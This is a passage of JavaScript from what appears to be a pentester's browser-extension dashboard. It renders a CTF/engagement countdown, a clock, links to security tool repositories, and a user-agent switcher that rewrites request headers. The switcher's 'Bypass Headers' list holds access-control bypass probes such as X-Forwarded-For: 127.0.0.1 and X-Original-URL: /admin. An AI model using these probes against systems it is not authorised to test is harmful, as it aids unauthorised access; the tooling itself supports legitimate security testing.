                  <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
                </svg>
              </button>
            </div>
          </div>

          <!-- Segmented Digital Cards Grid -->
          <div class="countdown-cards-grid">
            <div class="countdown-card" id="cd-card-days">
              <span class="countdown-num" id="cd-val-days">00</span>
              <span class="countdown-unit">DAYS</span>
            </div>
            <div class="countdown-card" id="cd-card-hours">
              <span class="countdown-num" id="cd-val-hours">00</span>
              <span class="countdown-unit">HOURS</span>
            </div>
            <div class="countdown-card" id="cd-card-mins">
              <span class="countdown-num" id="cd-val-mins">00</span>
              <span class="countdown-unit">MINS</span>
            </div>
            <div class="countdown-card" id="cd-card-secs">
              <span class="countdown-num" id="cd-val-secs">00</span>
              <span class="countdown-unit">SECS</span>
            </div>
          </div>

          <!-- Progress Bar & Subtext -->
          <div class="countdown-progress-section">
            <div class="countdown-progress-track">
              <div class="countdown-progress-fill" id="cd-progress-fill" style="width: 0%;"></div>
            </div>
            <div class="countdown-sub-row">
              <span class="countdown-target-sub" id="cd-target-sub">Loading target deadline...</span>
              <span class="countdown-pct-sub" id="cd-pct-sub">0% elapsed</span>
            </div>
          </div>
        </div>

        <!-- Inline Settings Drawer -->
        <div class="countdown-settings-view">
          <div class="countdown-settings-header">
            <span class="countdown-settings-heading">Target &amp; Timer Settings</span>
            <button class="countdown-close-btn" id="cd-settings-close-btn" type="button" title="Close settings">&times;</button>
          </div>
          
          <div class="countdown-settings-body">
            <div class="countdown-form-group">
              <label class="countdown-form-label">Engagement / Target Name</label>
              <input type="text" class="countdown-input-text" id="cd-input-title" placeholder="e.g. CTF Finals / OSCP 24h Deadline" value="${escapeHtml(savedTitle)}">
            </div>

            <div class="countdown-form-group">
              <label class="countdown-form-label">Countdown Mode</label>
              <div class="countdown-mode-pills" id="cd-mode-pills">
                <button type="button" class="countdown-mode-pill ${mode === 'date' ? 'is-active' : ''}" data-mode="date">Target Date</button>
                <button type="button" class="countdown-mode-pill ${mode === 'sprint' ? 'is-active' : ''}" data-mode="sprint">Focus Sprint</button>
              </div>
            </div>

            <!-- Date Deadline Config -->
            <div class="countdown-panel" id="cd-panel-date" style="${mode === 'date' ? '' : 'display:none;'}">
              <div class="countdown-form-group">
                <label class="countdown-form-label">Target Date &amp; Time</label>
                <input type="datetime-local" class="countdown-input-datetime" id="cd-input-datetime">
              </div>
              <div class="countdown-form-group">
                <label class="countdown-form-label">Quick Presets</label>
                <div class="countdown-presets-row">
                  <button type="button" class="countdown-preset-btn" data-preset-hours="1">+1 Hr</button>
                  <button type="button" class="countdown-preset-btn" data-preset-hours="4">+4 Hrs</button>
                  <button type="button" class="countdown-preset-btn" data-preset-days="1">+24 Hrs</button>
                  <button type="button" class="countdown-preset-btn" data-preset-days="7">+7 Days</button>
                  <button type="button" class="countdown-preset-btn" data-preset-days="30">+30 Days</button>
                </div>
              </div>
            </div>

            <!-- Sprint Timer Config -->
            <div class="countdown-panel" id="cd-panel-sprint" style="${mode === 'sprint' ? '' : 'display:none;'}">
              <div class="countdown-form-group">
                <label class="countdown-form-label">Sprint Duration</label>
                <div class="countdown-presets-row">
                  <button type="button" class="countdown-sprint-btn-pill ${sprintMins === 25 ? 'is-active' : ''}" data-sprint="25">25m Pomodoro</button>
                  <button type="button" class="countdown-sprint-btn-pill ${sprintMins === 45 ? 'is-active' : ''}" data-sprint="45">45m Sprint</button>
                  <button type="button" class="countdown-sprint-btn-pill ${sprintMins === 60 ? 'is-active' : ''}" data-sprint="60">60m Deep Work</button>
                  <button type="button" class="countdown-sprint-btn-pill ${sprintMins === 90 ? 'is-active' : ''}" data-sprint="90">90m Marathon</button>
                </div>
              </div>
            </div>

            <div class="countdown-actions-row">
              <button type="button" class="countdown-action-btn btn-save" id="cd-btn-save">Save &amp; Start</button>
              <button type="button" class="countdown-action-btn btn-cancel" id="cd-btn-cancel">Cancel</button>
            </div>
          </div>
        </div>
      </div>
    `;

    setupCountdownWidgetLogic(container);
  }

  function setupCountdownWidgetLogic(container) {
    const root = container.querySelector('.countdown-widget-inner');
    if (!root) return;

    const titleEl = root.querySelector('#cd-title-text');
    const badgeEl = root.querySelector('#cd-status-badge');
    const sprintToggleBtn = root.querySelector('#cd-sprint-toggle-btn');
    const sprintResetBtn = root.querySelector('#cd-sprint-reset-btn');
    const gearBtn = root.querySelector('#cd-gear-btn');

    const daysEl = root.querySelector('#cd-val-days');
    const hoursEl = root.querySelector('#cd-val-hours');
    const minsEl = root.querySelector('#cd-val-mins');
    const secsEl = root.querySelector('#cd-val-secs');

    const progressFill = root.querySelector('#cd-progress-fill');
    const targetSub = root.querySelector('#cd-target-sub');
    const pctSub = root.querySelector('#cd-pct-sub');

    // Settings elements
    const closeBtn = root.querySelector('#cd-settings-close-btn');
    const titleInput = root.querySelector('#cd-input-title');
    const modePills = root.querySelectorAll('.countdown-mode-pill');
    const panelDate = root.querySelector('#cd-panel-date');
    const panelSprint = root.querySelector('#cd-panel-sprint');
    const datetimeInput = root.querySelector('#cd-input-datetime');
    const presetBtns = root.querySelectorAll('.countdown-preset-btn');
    const sprintPresetBtns = root.querySelectorAll('.countdown-sprint-btn-pill');
    const btnSave = root.querySelector('#cd-btn-save');
    const btnCancel = root.querySelector('#cd-btn-cancel');

    let currentMode = 'date';
    let currentTargetDate = null;
    let currentStartDate = null;
    let currentSprintMins = 45;
    let currentSprintRemaining = 45 * 60;
    let isSprintRunning = false;
    let selectedModeInSettings = 'date';
    let selectedSprintInSettings = 45;

    function formatForDatetimeLocal(d) {
      if (!d || isNaN(d.getTime())) d = new Date();
      const pad = n => String(n).padStart(2, '0');
      return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}`;
    }

    async function loadData() {
      currentMode = await StorageService.get('countdownMode', 'date');
      let targetIso = await StorageService.get('countdownTargetDate', '');
      let startIso = await StorageService.get('countdownStartDate', '');

      if (!targetIso) {
        const defTarget = new Date();
        defTarget.setDate(defTarget.getDate() + 7);
        defTarget.setHours(23, 59, 59, 0);
        targetIso = defTarget.toISOString();
        startIso = new Date().toISOString();
        await StorageService.set('countdownTargetDate', targetIso);
        await StorageService.set('countdownStartDate', startIso);
      }

      currentTargetDate = new Date(targetIso);
      currentStartDate = startIso ? new Date(startIso) : new Date();
      currentSprintMins = await StorageService.get('countdownSprintMins', 45);
      currentSprintRemaining = await StorageService.get('countdownSprintRemaining', currentSprintMins * 60);
      isSprintRunning = await StorageService.get('countdownSprintRunning', false);

      selectedModeInSettings = currentMode;
      selectedSprintInSettings = currentSprintMins;

      updateDisplay();
    }

    function updateDisplay() {
      if (currentMode === 'date') {
        if (sprintToggleBtn) sprintToggleBtn.style.display = 'none';
        if (sprintResetBtn) sprintResetBtn.style.display = 'none';

        const now = new Date();
        const diff = currentTargetDate ? (currentTargetDate - now) : 0;

        if (!currentTargetDate || diff <= 0) {
          if (daysEl) daysEl.textContent = '00';
          if (hoursEl) hoursEl.textContent = '00';
          if (minsEl) minsEl.textContent = '00';
          if (secsEl) secsEl.textContent = '00';
          if (badgeEl) {
            badgeEl.textContent = 'EXPIRED';
            badgeEl.className = 'countdown-badge is-expired';
          }
          if (progressFill) progressFill.style.width = '100%';
          if (targetSub) targetSub.textContent = 'Deadline reached!';
          if (pctSub) pctSub.textContent = '100% elapsed';
          return;
        }

        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
        const minutes = Math.floor((diff / 1000 / 60) % 60);
        const seconds = Math.floor((diff / 1000) % 60);

        if (daysEl) daysEl.textContent = String(days).padStart(2, '0');
        if (hoursEl) hoursEl.textContent = String(hours).padStart(2, '0');
        if (minsEl) minsEl.textContent = String(minutes).padStart(2, '0');
        if (secsEl) secsEl.textContent = String(seconds).padStart(2, '0');

        if (badgeEl) {
          if (diff < 3600000) {
            badgeEl.textContent = 'URGENT';
            badgeEl.className = 'countdown-badge is-urgent';
          } else {
            badgeEl.textContent = 'LIVE';
            badgeEl.className = 'countdown-badge';
          }
        }

        const totalSpan = currentTargetDate - currentStartDate;
        let pct = 0;
        if (totalSpan > 0) {
          pct = Math.min(100, Math.max(0, Math.round(((now - currentStartDate) / totalSpan) * 100)));
        }
        if (progressFill) progressFill.style.width = `${pct}%`;
        
        const dateStr = currentTargetDate.toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
        const timeStr = currentTargetDate.toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' });
        if (targetSub) targetSub.textContent = `Target: ${dateStr} at ${timeStr}`;
        if (pctSub) pctSub.textContent = `${pct}% elapsed`;
      } else {
        // Sprint Mode
        if (sprintToggleBtn) {
          sprintToggleBtn.style.display = 'inline-flex';
          sprintToggleBtn.innerHTML = isSprintRunning 
            ? '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>' 
            : '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"></polygon></svg>';
        }
        if (sprintResetBtn) sprintResetBtn.style.display = 'inline-flex';

        if (isSprintRunning && currentSprintRemaining > 0) {
          currentSprintRemaining--;
          StorageService.set('countdownSprintRemaining', currentSprintRemaining);
        }

        const totalSecs = currentSprintMins * 60;
        const mins = Math.floor(currentSprintRemaining / 60);
        const secs = currentSprintRemaining % 60;

        if (daysEl) daysEl.textContent = '00';
        if (hoursEl) hoursEl.textContent = '00';
        if (minsEl) minsEl.textContent = String(mins).padStart(2, '0');
        if (secsEl) secsEl.textContent = String(secs).padStart(2, '0');

        if (currentSprintRemaining === 0) {
          if (badgeEl) {
            badgeEl.textContent = 'FINISHED';
            badgeEl.className = 'countdown-badge is-expired';
          }
          if (progressFill) progressFill.style.width = '100%';
          if (targetSub) targetSub.textContent = `Sprint completed (${currentSprintMins}m)`;
          if (pctSub) pctSub.textContent = '100% complete';
          isSprintRunning = false;
          if (sprintToggleBtn) {
            sprintToggleBtn.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"></polygon></svg>';
          }
          StorageService.set('countdownSprintRunning', false);
        } else {
          if (badgeEl) {
            badgeEl.textContent = isSprintRunning ? 'SPRINT' : 'PAUSED';
            badgeEl.className = isSprintRunning ? 'countdown-badge' : 'countdown-badge is-urgent';
          }
          const pct = Math.min(100, Math.max(0, Math.round(((totalSecs - currentSprintRemaining) / totalSecs) * 100)));
          if (progressFill) progressFill.style.width = `${pct}%`;
          if (targetSub) targetSub.textContent = `${currentSprintMins}m Sprint (${isSprintRunning ? 'running' : 'paused'})`;
          if (pctSub) pctSub.textContent = `${pct}% complete`;
        }
      }
    }

    function openSettings() {
      root.classList.add('is-editing');
      if (titleInput && titleEl) titleInput.value = titleEl.textContent;
      if (datetimeInput) {
        datetimeInput.value = formatForDatetimeLocal(currentTargetDate);
      }
      setSettingsMode(currentMode);
    }

    function closeSettings() {
      root.classList.remove('is-editing');
    }

    function setSettingsMode(m) {
      selectedModeInSettings = m;
      modePills.forEach(p => p.classList.toggle('is-active', p.dataset.mode === m));
      if (m === 'date') {
        if (panelDate) panelDate.style.display = 'block';
        if (panelSprint) panelSprint.style.display = 'none';
      } else {
        if (panelDate) panelDate.style.display = 'none';
        if (panelSprint) panelSprint.style.display = 'block';
      }
    }

    if (gearBtn) {
      gearBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        openSettings();
      });
    }

    const titleWrap = root.querySelector('.countdown-title-wrap');
    if (titleWrap) {
      titleWrap.addEventListener('dblclick', (e) => {
        e.stopPropagation();
        openSettings();
      });
    }

    if (closeBtn) closeBtn.addEventListener('click', closeSettings);
    if (btnCancel) btnCancel.addEventListener('click', closeSettings);

    modePills.forEach(p => {
      p.addEventListener('click', () => setSettingsMode(p.dataset.mode));
    });

    presetBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        const now = new Date();
        if (btn.dataset.presetHours) {
          now.setHours(now.getHours() + parseInt(btn.dataset.presetHours, 10));
        } else if (btn.dataset.presetDays) {
          now.setDate(now.getDate() + parseInt(btn.dataset.presetDays, 10));
        }
        if (datetimeInput) datetimeInput.value = formatForDatetimeLocal(now);
      });
    });

    sprintPresetBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        selectedSprintInSettings = parseInt(btn.dataset.sprint, 10);
        sprintPresetBtns.forEach(b => b.classList.toggle('is-active', b === btn));
      });
    });

    if (btnSave) {
      btnSave.addEventListener('click', async () => {
        const newTitle = (titleInput ? titleInput.value.trim() : '') || 'CTF / Engagement Deadline';
        if (titleEl) titleEl.textContent = newTitle;
        currentMode = selectedModeInSettings;

        if (currentMode === 'date') {
          if (datetimeInput && datetimeInput.value) {
            const picked = new Date(datetimeInput.value);
            if (!isNaN(picked.getTime())) {
              currentTargetDate = picked;
              currentStartDate = new Date();
              await StorageService.set('countdownTargetDate', currentTargetDate.toISOString());
              await StorageService.set('countdownStartDate', currentStartDate.toISOString());
            }
          }
        } else {
          currentSprintMins = selectedSprintInSettings;
          currentSprintRemaining = currentSprintMins * 60;
          isSprintRunning = true;
          await StorageService.set('countdownSprintMins', currentSprintMins);
          await StorageService.set('countdownSprintRemaining', currentSprintRemaining);
          await StorageService.set('countdownSprintRunning', true);
        }

        await StorageService.set('countdownTitle', newTitle);
        await StorageService.set('countdownMode', currentMode);

        closeSettings();
        updateDisplay();
      });
    }

    if (sprintToggleBtn) {
      sprintToggleBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        isSprintRunning = !isSprintRunning;
        StorageService.set('countdownSprintRunning', isSprintRunning);
        updateDisplay();
      });
    }

    if (sprintResetBtn) {
      sprintResetBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        currentSprintRemaining = currentSprintMins * 60;
        isSprintRunning = false;
        StorageService.set('countdownSprintRemaining', currentSprintRemaining);
        StorageService.set('countdownSprintRunning', false);
        updateDisplay();
      });
    }

    loadData();
    registerWidgetInterval(updateDisplay, 1000);
  }

  function initCountdownTimer() {
    // Handled in renderCountdownWidget / setupCountdownWidgetLogic
  }

  function renderWeatherWidget(container) {
    container.innerHTML = `
      <div class="weather-wrapper">
        <div class="weather-temp">21°C</div>
        <div class="weather-details">
          <span class="weather-cond">Mostly Clear</span>
          <span class="weather-loc">Ops Hub • Secure</span>
        </div>
      </div>
    `;
  }

  function renderWorldClockWidget(container) {
    const timezones = [
      { name: 'UTC', zone: 'UTC' },
      { name: 'EST', zone: 'America/New_York' },
      { name: 'GMT', zone: 'Europe/London' },
      { name: 'JST', zone: 'Asia/Tokyo' }
    ];

    const list = document.createElement('div');
    list.className = 'worldclock-list';

    function updateClocks() {
      list.innerHTML = '';
      const now = new Date();
      timezones.forEach(tz => {
        try {
          const str = now.toLocaleTimeString('en-US', {
            timeZone: tz.zone,
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
          });
          const row = document.createElement('div');
          row.className = 'worldclock-row';
          row.innerHTML = `<span class="wc-zone">${tz.name}</span><span class="wc-time">${str}</span>`;
          list.appendChild(row);
        } catch {
          // Fallback
        }
      });
    }

    updateClocks();
    container.appendChild(list);
  }

  function renderGithubWidget(container) {
    const repos = [
      { name: 'swisskyrepo/PayloadsAllTheThings', desc: 'Pentest payloads & bypasses' },
      { name: 'danielmiessler/SecLists', desc: 'Security tester wordlists' },
      { name: 'peass-ng/PEASS-ng', desc: 'LinPEAS & WinPEAS privesc' },
      { name: 'projectdiscovery/nuclei-templates', desc: 'Vulnerability scanner templates' },
      { name: 'carlospolop/hacktricks', desc: 'Pentesting wiki & methods' }
    ];

    const list = document.createElement('div');
    list.className = 'github-tools-list';
    repos.forEach(r => {
      const a = document.createElement('a');
      a.className = 'gh-tool-item';
      a.href = `https://github.com/${r.name}`;
      a.target = '_blank';
      a.rel = 'noreferrer noopener';
      a.innerHTML = `
        <span class="gh-name">${r.name.split('/')[1]}</span>
        <span class="gh-desc">${r.desc}</span>
      `;
      list.appendChild(a);
    });
    container.appendChild(list);
  }

  function renderSystemStatusWidget(container) {
    container.innerHTML = `
      <div class="system-status-list">
        <div class="status-item">
          <span class="status-key">VAPT Status</span>
          <span class="status-val secure">READY</span>
        </div>
        <div class="status-item">
          <span class="status-key">Telemetry Ping</span>
          <span class="status-val mono">14ms</span>
        </div>
        <div class="status-item">
          <span class="status-key">Sandbox</span>
          <span class="status-val secure">ACTIVE</span>
        </div>
      </div>
    `;
  }

  function renderUserAgentsWidget(container) {
    const UA_RULE_ID = 1001;
    const CH_RULE_ID = 1002;

    const CLIENT_HINTS_HEADERS = [
      'sec-ch-ua',
      'sec-ch-ua-arch',
      'sec-ch-ua-bitness',
      'sec-ch-ua-full-version',
      'sec-ch-ua-full-version-list',
      'sec-ch-ua-mobile',
      'sec-ch-ua-model',
      'sec-ch-ua-platform',
      'sec-ch-ua-platform-version',
      'sec-ch-ua-wow64'
    ];

    const categories = {
      browsers: [
        {
          name: 'Chrome Windows',
          value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
          platform: 'Win32'
        },
        {
          name: 'Firefox Windows',
          value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
          platform: 'Win32'
        },
        {
          name: 'Safari macOS',
          value: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
          platform: 'MacIntel'
        },
        {
          name: 'Edge Windows',
          value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
          platform: 'Win32'
        }
      ],
      mobile: [
        {
          name: 'iPhone iOS 17',
          value: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
          platform: 'iPhone'
        },
        {
          name: 'Android Chrome Pixel',
          value: 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
          platform: 'Linux armv8l'
        },
        {
          name: 'Googlebot 2.1',
          value: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
          platform: ''
        },
        {
          name: 'curl / 8.4.0',
          value: 'curl/8.4.0',
          platform: ''
        }
      ],
      bypass: [
        {
          name: 'X-Forwarded-For (Localhost IP Spoof)',
          value: 'X-Forwarded-For: 127.0.0.1'
        },
        {
          name: 'X-Client-IP',
          value: 'X-Client-IP: 127.0.0.1'
        },
        {
          name: 'X-Original-URL (Admin Path Override)',
          value: 'X-Original-URL: /admin'
        },
        {
          name: 'X-Rewrite-URL',
          value: 'X-Rewrite-URL: /admin'
        },
        {
          name: 'X-Forwarded-Host',
          value: 'X-Forwarded-Host: localhost'
        },
        {
          name: 'Origin (CORS Check)',
          value: 'Origin: null'
        }
      ]
    };

    let activeCategory = 'browsers';
    let currentSessionUa = null;

    const root = document.createElement('div');
    root.className = 'widget-useragents';

    // Active session status bar
    const statusBar = document.createElement('div');
    statusBar.className = 'ua-active-status-bar';

    const statusInfo = document.createElement('div');
    statusInfo.className = 'ua-status-info';

    const statusDot = document.createElement('span');
    statusDot.className = 'ua-status-dot';

    const statusLabel = document.createElement('span');
    statusLabel.className = 'ua-status-label';
    statusLabel.textContent = 'SESSION UA:';

    const statusName = document.createElement('span');
    statusName.className = 'ua-status-name';
    statusName.textContent = 'DEFAULT';

    statusInfo.appendChild(statusDot);
    statusInfo.appendChild(statusLabel);
    statusInfo.appendChild(statusName);

    const resetBtn = document.createElement('button');
    resetBtn.type = 'button';
    resetBtn.className = 'ua-reset-btn';
    resetBtn.textContent = 'Reset Default';
    resetBtn.disabled = true;

    statusBar.appendChild(statusInfo);
    statusBar.appendChild(resetBtn);

    const tabsBar = document.createElement('div');
    tabsBar.className = 'ua-category-tabs';

    const tabConfig = [
      { key: 'browsers', label: 'Desktop' },
      { key: 'mobile', label: 'Mobile & Bots' },
      { key: 'custom', label: 'Custom UA' },
      { key: 'bypass', label: 'Bypass Headers' }
    ];

    const listContainer = document.createElement('div');
    listContainer.className = 'ua-header-list';

    function updateStatusUI() {
      if (currentSessionUa && currentSessionUa.value) {
        statusDot.classList.add('is-active');
        statusName.classList.add('is-active');
        statusName.textContent = currentSessionUa.name || 'CUSTOM';
        resetBtn.disabled = false;
      } else {
        statusDot.classList.remove('is-active');
        statusName.classList.remove('is-active');
        statusName.textContent = 'DEFAULT';
        resetBtn.disabled = true;
      }
    }

    async function applySessionUa(name, value, platform = '') {
      currentSessionUa = { name, value, platform };
      updateStatusUI();
      renderList();

      const uaRule = {
        id: UA_RULE_ID,
        priority: 999,
        action: {
          type: 'modifyHeaders',
          requestHeaders: [
            { header: 'user-agent', operation: 'set', value: value }
          ]
        },
        condition: {
          urlFilter: '*',
          resourceTypes: [
            'main_frame',
            'sub_frame',
            'stylesheet',
            'script',
            'image',
            'font',
            'object',
            'xmlhttprequest',
            'ping',
            'csp_report',
            'media',
            'websocket',
            'other'
          ]
        }
      };

      const chRule = {
        id: CH_RULE_ID,
        priority: 999,
        action: {
          type: 'modifyHeaders',
          requestHeaders: [
            { header: 'sec-ch-ua', operation: 'remove' },
            { header: 'sec-ch-ua-mobile', operation: 'remove' },
            { header: 'sec-ch-ua-platform', operation: 'remove' }
          ]
        },
        condition: {
          urlFilter: '*',
          resourceTypes: [
            'main_frame',
            'sub_frame',
            'stylesheet',
            'script',
            'image',
            'font',
            'object',
            'xmlhttprequest',
            'ping',
            'csp_report',
            'media',
            'websocket',
            'other'
          ]
        }
      };

      try {
        if (typeof chrome !== 'undefined' && chrome.declarativeNetRequest) {
          if (chrome.declarativeNetRequest.updateDynamicRules) {
            await chrome.declarativeNetRequest.updateDynamicRules({
              removeRuleIds: [UA_RULE_ID, CH_RULE_ID],
              addRules: [uaRule, chRule]
            });
          }
          if (chrome.declarativeNetRequest.updateSessionRules) {
            await chrome.declarativeNetRequest.updateSessionRules({
              removeRuleIds: [UA_RULE_ID, CH_RULE_ID],
              addRules: [uaRule, chRule]
            });
          }
        }
        await StorageService.set('activeSessionUserAgent', currentSessionUa);

        if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
          chrome.runtime.sendMessage({ action: 'applyUserAgent', data: currentSessionUa }).catch(() => {});
        }

        if (typeof showToast === 'function') {
          showToast(`Session User-Agent applied: ${name}`);
        }
      } catch (err) {
        console.error('Failed to set session user agent:', err);
        if (typeof showToast === 'function') {
          showToast('Could not set session User-Agent: ' + (err.message || ''));
        }
      }
    }

    async function resetSessionUa() {
      currentSessionUa = null;
      updateStatusUI();
      renderList();

      try {
        if (typeof chrome !== 'undefined' && chrome.declarativeNetRequest) {
          if (chrome.declarativeNetRequest.updateDynamicRules) {
            await chrome.declarativeNetRequest.updateDynamicRules({
              removeRuleIds: [UA_RULE_ID, CH_RULE_ID]
            });
          }
          if (chrome.declarativeNetRequest.updateSessionRules) {
            await chrome.declarativeNetRequest.updateSessionRules({
              removeRuleIds: [UA_RULE_ID, CH_RULE_ID]
            });
          }
        }
        await StorageService.set('activeSessionUserAgent', null);

        if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
          chrome.runtime.sendMessage({ action: 'resetUserAgent' }).catch(() => {});
        }

        if (typeof showToast === 'function') {
          showToast('Session User-Agent restored to default');
        }
      } catch (err) {
        console.error('Failed to reset session user agent:', err);
        if (typeof showToast === 'function') {
          showToast('Could not reset session User-Agent: ' + (err.message || ''));
        }
      }
    }

    resetBtn.addEventListener('click', () => {
      resetSessionUa();
    });

    async function copyToClipboard(text, btnElement) {
      try {
        await navigator.clipboard.writeText(text);
        btnElement.textContent = 'Copied';
        setTimeout(() => {
          btnElement.textContent = 'Copy';
        }, 1500);
      } catch {
        const temp = document.createElement('textarea');
        temp.value = text;
        document.body.appendChild(temp);
        temp.select();
        document.execCommand('copy');
        document.body.removeChild(temp);
        btnElement.textContent = 'Copied';
        setTimeout(() => {
          btnElement.textContent = 'Copy';
        }, 1500);
      }
    }

    function renderList() {
      listContainer.innerHTML = '';

      if (activeCategory === 'custom') {
        const customWrap = document.createElement('div');
        customWrap.className = 'ua-custom-container';

        const textarea = document.createElement('textarea');
        textarea.className = 'ua-custom-textarea';
        textarea.placeholder = 'Paste or type custom User-Agent string...';
        if (currentSessionUa && currentSessionUa.name === 'Custom') {
          textarea.value = currentSessionUa.value;
        }

        const actionRow = document.createElement('div');
        actionRow.className = 'ua-custom-actions';

        const applyBtn = document.createElement('button');
        applyBtn.type = 'button';
        applyBtn.className = 'ua-custom-apply-btn';
        applyBtn.textContent = 'Apply to Session';
        applyBtn.addEventListener('click', () => {
          const val = textarea.value.trim();
          if (!val) {
            if (typeof showToast === 'function') {
              showToast('Please enter a User-Agent string');
            }
            return;
          }
          applySessionUa('Custom', val);
        });

        const copyBtn = document.createElement('button');
        copyBtn.type = 'button';
        copyBtn.className = 'ua-header-copy-btn';
        copyBtn.textContent = 'Copy';
        copyBtn.addEventListener('click', () => {
          const val = textarea.value.trim();
          if (val) {
            copyToClipboard(val, copyBtn);
          }
        });

        actionRow.appendChild(applyBtn);
        actionRow.appendChild(copyBtn);

        customWrap.appendChild(textarea);
        customWrap.appendChild(actionRow);
        listContainer.appendChild(customWrap);
        return;
      }

      const items = categories[activeCategory] || [];
      items.forEach(item => {
        const row = document.createElement('div');
        row.className = 'ua-header-item';

        const top = document.createElement('div');
        top.className = 'ua-header-top';

        const nameSpan = document.createElement('span');
        nameSpan.className = 'ua-header-name';
        nameSpan.textContent = item.name;

        const actionsGroup = document.createElement('div');
        actionsGroup.className = 'ua-header-actions';

        if (activeCategory === 'browsers' || activeCategory === 'mobile') {
          const isCurrentActive = currentSessionUa && currentSessionUa.value === item.value;
          const applyBtn = document.createElement('button');
          applyBtn.className = `ua-header-apply-btn ${isCurrentActive ? 'is-active' : ''}`;
          applyBtn.type = 'button';
          applyBtn.textContent = isCurrentActive ? 'Active' : 'Apply';
          applyBtn.title = isCurrentActive ? 'Active session User-Agent' : 'Apply as default for browser session';

          applyBtn.addEventListener('click', () => {
            if (isCurrentActive) {
              resetSessionUa();
            } else {
              applySessionUa(item.name, item.value, item.platform || '');
            }
          });

          actionsGroup.appendChild(applyBtn);
        }

        const copyBtn = document.createElement('button');
        copyBtn.className = 'ua-header-copy-btn';
        copyBtn.type = 'button';
        copyBtn.textContent = 'Copy';
        copyBtn.addEventListener('click', () => {
          copyToClipboard(item.value, copyBtn);
        });

        actionsGroup.appendChild(copyBtn);

        top.appendChild(nameSpan);
        top.appendChild(actionsGroup);

        const valSpan = document.createElement('div');
        valSpan.className = 'ua-header-val';
        valSpan.textContent = item.value;

        row.appendChild(top);
        row.appendChild(valSpan);
        listContainer.appendChild(row);
      });
    }

    tabConfig.forEach(t => {
      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = `ua-tab-btn ${t.key === activeCategory ? 'active' : ''}`;
      btn.textContent = t.label;
      btn.addEventListener('click', () => {
        activeCategory = t.key;
        tabsBar.querySelectorAll('.ua-tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        renderList();
      });
      tabsBar.appendChild(btn);
    });

    // Check stored state and declarativeNetRequest rules
    StorageService.get('activeSessionUserAgent').then(saved => {
      if (saved && saved.value) {
        currentSessionUa = saved;
        updateStatusUI();
        renderList();
      }

      if (typeof chrome !== 'undefined' && chrome.declarativeNetRequest && chrome.declarativeNetRequest.getSessionRules) {
        chrome.declarativeNetRequest.getSessionRules().then(rules => {
          const rule = rules.find(r => r.id === UA_RULE_ID);
          if (!rule && currentSessionUa) {
            currentSessionUa = null;
            StorageService.set('activeSessionUserAgent', null);
            updateStatusUI();
            renderList();
          } else if (rule && !currentSessionUa) {
            const ruleValue = rule.action && rule.action.requestHeaders && rule.action.requestHeaders[0] && rule.action.requestHeaders[0].value;
            if (ruleValue) {
              currentSessionUa = { name: 'Active Rule', value: ruleValue };
              StorageService.set('activeSessionUserAgent', currentSessionUa);
              updateStatusUI();
              renderList();
            }
          }
        }).catch(() => {});
      }
    });

    renderList();

    root.appendChild(statusBar);
    root.appendChild(tabsBar);
    root.appendChild(listContainer);
    container.appendChild(root);
  }

